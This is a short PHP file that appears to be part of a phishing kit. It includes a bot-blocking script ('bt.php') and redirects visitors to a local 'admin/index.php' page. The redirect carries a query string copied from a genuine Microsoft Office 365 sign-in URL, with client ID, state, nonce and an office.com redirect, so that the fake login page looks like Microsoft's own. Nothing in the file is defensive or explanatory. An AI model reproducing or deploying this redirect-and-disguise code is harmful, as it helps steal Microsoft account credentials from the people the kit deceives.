<?php 
include '../bt.php';

?>
<?php

$unique = substr(base64_encode(mt_rand()), 0, 30);
$zon = "?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dYt7-7eyyHeFUM0uYZsfoVtrmWR-ZHK4M_YfvCz6t_0xh5BbufcLwdcwJNuZNClJLaPdPIOOVJ9xw5703gnuqjnqxz4UaW5TQI0gduDMua4HmXHlHaRKE7IVziT-USqs5&nonce=636850646117429778.Y2Q5ZDIwM2ItMjY1YS00NDE1LWJlODEtNjUzNTIwMjEzY2YyODEwNThkYzgtMjVkOS00NTBkLTk0Y2QtOTgzMGRhZWZhYzFi&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&sso_reload=true";
header("Location:admin/index.php$zon");
?>